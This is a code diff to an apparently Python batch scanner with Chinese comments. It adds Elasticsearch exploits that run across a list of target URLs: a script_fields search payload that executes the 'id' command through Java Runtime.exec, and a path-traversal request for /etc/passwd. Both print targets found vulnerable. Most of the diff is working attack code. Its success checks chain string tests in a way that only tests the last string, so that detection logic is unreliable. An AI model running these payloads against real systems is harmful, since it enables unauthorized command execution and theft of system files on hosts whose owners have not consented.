@@ -8,13 +8,46 @@ from config import tomcat_user_dir
 from config import tomcat_pass_dir
 from config import nacos_user_dir
 from config import nacos_pass_dir
+import json
 
-# es未授权访问漏洞批量检测
 
+
+# elasticsearch数据库相关漏洞扫描
 def es_unauthorized():
 
     hearder={
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)'
+    }
+
+    exec_header = {
+        'Accept': '*/*',
+        'Accept-Language': 'en',
+        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
+        'Connection': 'close',
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+
+    pass_header = {
+        'User-Agent': 'Mozilla/5.0 (compatible; Elasticsearch; +http://www.elastic.co/)',
+        'Accept': '*/*',
+        'Connection': 'close'
+    }
+
+    # 设置请求正文
+    exec_data = {
+        'size': 1,
+        'query': {
+            'filtered': {
+                'query': {
+                    'match_all': {}
+                }
+            }
+        },
+        'script_fields': {
+            'command': {
+                'script': "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
+            }
+        }
     }
 
     # 资产文件存入列表
@@ -36,7 +69,7 @@ def es_unauthorized():
 
         # 格式化时间，只保留时、分、秒
         formatted_time = now.strftime("%H:%M:%S")
-
+        # 未授权访问漏洞
         try:
             # 忽略ssl证书验证
             res = requests.get(url,headers=hearder,allow_redirects=False,timeout=2,verify=False)
@@ -46,6 +79,36 @@ def es_unauthorized():
                 print("[+]"+" "+formatted_time+" "+"目标："+" "+url+" "+"存在未授权访问漏洞")
         except:
             pass
+
+        # elasticsearch远程命令执行漏洞
+        cmd_exec_dir = "/_search?pretty"
+        # 将数据转换为 JSON 格式
+        json_data = requests.compat.json.dumps(exec_data)
+        # 发送 POST 请求
+        try:
+            es_data_response = requests.post(url+cmd_exec_dir, headers=exec_header, data=json_data, allow_redirects=False,timeout=2,verify=False)
+            es_data_response.encoding='utf-8'
+            es_data_response_text = es_data_response.text
+            es_data_response_json = json.loads(es_data_response_text)
+            exec_result = es_data_response_json['hits']['hits'][0]['fields']['command'][0]
+            if 'command' and 'uid' and 'gid' and 'groups' in es_data_response_text:
+                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+cmd_exec_dir+" "+"存在远程命令执行漏洞"+" "+"("+exec_result+")")
+        except:
+            pass
+
+        # elasticsearch目录穿越漏洞
+        es_pass_dir = '/_plugin/head/../../../../../../../../../etc/passwd'
+        try:
+            # 忽略ssl证书验证
+            res_pass = requests.get(url+es_pass_dir,headers=pass_header,allow_redirects=False,timeout=2,verify=False)
+            res_pass.encoding='utf-8'
+            res_pass_text = res_pass.text
+            if '/bin/bash' and '/usr/sbin/nologin' and 'bin' in res_pass_text:
+                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+es_pass_dir+" "+"存在目录穿越漏洞")
+        except:
+            pass
+
+
 
 
 
